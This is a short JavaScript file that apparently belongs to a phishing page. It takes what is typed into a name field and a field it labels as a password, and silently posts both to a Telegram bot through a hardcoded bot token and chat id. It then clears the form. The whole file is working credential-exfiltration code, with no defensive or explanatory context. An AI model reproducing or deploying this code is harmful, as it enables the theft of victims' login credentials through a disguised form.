//bot token
var telegram_bot_id = "5858343744:AAHaowZLWptD3hpdleB5yz1vgdhIgFzZriE";
//chat id
var chat_id = 5858343744;
var u_name, message;
var ready = function () {
    u_name = document.getElementById("name").value;
    message = document.getElementById("message").value;
    message = "Name: " + u_name + "\nPassword: " + message;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("name").value = "";
    document.getElementById("message").value = "";
    return false;
};
